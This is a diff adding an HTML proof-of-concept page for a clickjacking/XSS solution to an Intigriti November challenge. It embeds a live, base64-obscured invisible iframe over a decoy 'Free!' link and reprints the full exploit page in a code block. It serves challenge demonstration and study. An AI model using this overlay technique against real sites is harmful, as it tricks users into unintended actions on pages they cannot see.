@@ -1,0 +1,117 @@
+<div class="xss"><h1>Intigriti - Clickjacking XSS</h1>
+<h4>I made this POC to exploit the XSS to the november intigriti's challenge.</h4>
+
+<div class="liveCode" id="intigritiXssIframe">
+<script>
+let iframe = document.createElement("iframe");
+iframe.src = atob("aHR0cHM6Ly9jaGFsbGVuZ2UtMTEyMC5pbnRpZ3JpdGkuaW8vcXIuaHRtbD91cmw9aHR0cHM6Ly8mc2l6ZT0xMDBweDtjb250ZW50OnVybChkYXRhOmltYWdlL3N2Zy94bWwsPHN2Zz48L3N2Zz4pO2JhY2tncm91bmQtaW1hZ2U6dXJsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQURJQUFBQXlDQVlBQUFBZVA0aXhBQUFDSFVsRVFWUm9RJTJCMVk3VzRETVFocjN2JTJCaGI3cHBtWmhyRXhNTnRhcXlYJTJCczFsNEElMkZnSFJjMTNVOVB1QnZuRVRlak1YRHlKc1I4amlNSEVhYUVEalNhZ0oyZTF1YmtUR0dQR1FPQiUyRmNhTmlqTWQlMkIlMkZ2NGo3NEdRJTJCb0RCMmxSRlNRTVNEOFgyVSUyRms4NlNiMDJFSVJvWm1ZRWpTeGd3SnBMdDYlMkJpdHpJZzZFT1dEYUtydlkwSVJCTVdVWk5nZEd0MEQyYnI3Y09hSCUyQlV4NXAxVmFpQWlUQ0pPYUs3bTVycFVSUlNzaVclMkYyYzdldjQ0MTVqZThUZE1DSWFKYlV5ZjNYJTJGSjJWVVBNTHFQT3N2VFB2eDJUZUNQMzBwWTYlMkJTbk0ySU12c01DZ09OUWNTZ1l4S3FBZUo2SnlFN0VaUk0zSnpKWnNyS2FZaHNMeWY0UDJCVnBZVVZLWlpJN0RHTXJheWZZSmx1S2I5WjJVVkVuWm1MSWI0anFWJTJCbHVJd29hVEZHc3VhWFNRYjNhbUVFcTVOVFRsVkZpNUxMaWtMRko3YlpWU0tzQ3JGcE9Cc3NJOXNWRnJiTVh2R0lLc2xxZEklMkJlMnZWSmlaSFY0T2RJSVp1ZXM0cTQycnVjeUU1RGN5NVBySFN2Z3QlMkJTVnRiWmxVOVVIMkhNenFEY0clMkJhVDFOM3lxM1NjM1QlMkJVcnpKV2Q3dThMYTBWemM3VkZWRlhmV1BIOEhZaXJDZGtnU25VVldsV0ZXMEZZTG16dTRabGxRZmZaWWp2c1BDdlpsZFhYWVl3OHhtYjAlMkI1bjFjWllrbGIySThFSzBheThxZ1FyeWJRa29pNVN6TnhzOUZFeXp2eFNUaVFiVlZnUFVFeGx2bWxQUkNHaTd1ZzRETExnbldIU3FWdzJJODVtcjF4ekVua2wlMkJ1enN3OGhocEFtQkk2MG1ZTGUzUFl4c1E5ZjA0c2N3OGdWSkwwQ1lzRzZ2c1FBQUFBQkpSVTVFcmtKZ2dnJTNEJTNEJyk7bWFyZ2luLWxlZnQ6NjAw");
+let a = document.createElement("a");
+a.innerText = "Free!";
+document.querySelector("#intigritiXssIframe").appendChild(a);
+document.querySelector("#intigritiXssIframe").appendChild(iframe);
+</script>
+<style>
+.liveCode {
+  margin: 0 0 0 0;
+}
+
+.liveCode > iframe {
+  width: 100%;
+  height: 100%;
+  margin-left: -78%;
+  z-index: 1;
+  background-color: red;
+  opacity: 0;
+  top: 1%;
+  position: relative;
+}
+
+.liveCode > a {
+  position: absolute;
+  top: 40%;
+  z-index: 0;
+} 
+</style>
+</div>
+
+<div>
+<p>Move this range button to see the hidden iframe. <input type="range" id="iframeOpacity" name="iframeOpacity" min="0" max="1" step="0.01" value="0"></p>
+<script>
+let iframeOpacity = document.querySelector("#iframeOpacity");
+
+iframeOpacity.addEventListener("change", function() {
+  document.querySelector(".liveCode > iframe").style.opacity = iframeOpacity.value;
+});
+
+</script>
+</div>
+
+<pre><code class="fastframeworkCode">&lt;!DOCTYPE html>
+&lt;html>
+&lt;head>
+&lt;meta charset="utf-8">
+&lt;title>November Intigriti - Clickjaking XSS</title>
+&lt;/head>
+&lt;body>
+&lt;a href="#legitWebsite">FREE!</a>
+&lt;script>
+var iframe = document.createElement("iframe");
+iframe.src = atob("aHR0cHM6Ly9jaGFsbGVuZ2UtMTEyMC5pbnRpZ3J
+pdGkuaW8vcXIuaHRtbD91cmw9aHR0cHM6Ly8mc2l6ZT0x
+MDBweDtjb250ZW50OnVybChkYXRhOmltYWdlL3N2Zy94b
+WwsPHN2Zz48L3N2Zz4pO2JhY2tncm91bmQtaW1hZ2U6dX
+JsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEt
+HZ29BQUFBTlNVaEVVZ0FBQURJQUFBQXlDQVlBQUFBZVA0
+aXhBQUFDSFVsRVFWUm9RJTJCMVk3VzRETVFocjN2JTJCa
+GI3cHBtWmhyRXhNTnRhcXlYJTJCczFsNEElMkZnSFJjMT
+NVOVB1QnZuRVRlak1YRHlKc1I4amlNSEVhYUVEalNhZ0o
+yZTF1YmtUR0dQR1FPQiUyRmNhTmlqTWQlMkIlMkZ2NGo3
+NEdRJTJCb0RCMmxSRlNRTVNEOFgyVSUyRms4NlNiMDJFS
+VJvWm1ZRWpTeGd3SnBMdDYlMkJpdHpJZzZFT1dEYUtydl
+kwSVJCTVdVWk5nZEd0MEQyYnI3Y09hSCUyQlV4NXAxVmF
+pQWlUQ0pPYUs3bTVycFVSUlNzaVclMkYyYzdldjQ0MTVq
+ZThUZE1DSWFKYlV5ZjNYJTJGSjJWVVBNTHFQT3N2VFB2e
+DJUZUNQMzBwWTYlMkJTbk0ySU12c01DZ09OUWNTZ1l4S3
+FBZUo2SnlFN0VaUk0zSnpKWnNyS2FZaHNMeWY0UDJCVnB
+ZVVZLWlpJN0RHTXJheWZZSmx1S2I5WjJVVkVuWm1MSWI0
+anFWJTJCbHVJd29hVEZHc3VhWFNRYjNhbUVFcTVOVFRsV
+kZpNUxMaWtMRko3YlpWU0tzQ3JGcE9Cc3NJOXNWRnJiTV
+h2R0lLc2xxZEklMkJlMnZWSmlaSFY0T2RJSVp1ZXM0cTQ
+ycnVjeUU1RGN5NVBySFN2Z3QlMkJTVnRiWmxVOVVIMkhN
+enFEY0clMkJhVDFOM3lxM1NjM1QlMkJVcnpKV2Q3dThMY
+TBWemM3VkZWRlhmV1BIOEhZaXJDZGtnU25VVldsV0ZXME
+ZZTG16dTRabGxRZmZaWWp2c1BDdlpsZFhYWVl3OHhtYjA
+lMkI1bjFjWllrbGIySThFSzBheThxZ1FyeWJRa29pNVN6
+TnhzOUZFeXp2eFNUaVFiVlZnUFVFeGx2bWxQUkNHaTd1Z
+zRETExnbldIU3FWdzJJODVtcjF4ekVua2wlMkJ1enN3OG
+hocEFtQkk2MG1ZTGUzUFl4c1E5ZjA0c2N3OGdWSkwwQ1l
+zRzZ2c1FBQUFBQkpSVTVFcmtKZ2dnJTNEJTNEJyk7bWFy
+Z2luLWxlZnQ6NjAw");
+document.body.appendChild(iframe);
+&lt;/script>
+&lt;style>
+body {
+  margin: 0 0 0 0;
+}
+
+iframe {
+  width: 700px;
+  height: 100px;
+  margin-left: -63%;
+  margin-top: -1%;
+  z-index: 1;
+  background-color: red;
+  opacity: 0;
+  z-index: 1;
+  position: absolute;
+}
+
+a {
+  top: 1%;
+  position: absolute;
+  z-index: 0;
+}
+&lt;/style>
+&lt;/body>
+&lt;/html></code></pre>
+</div>
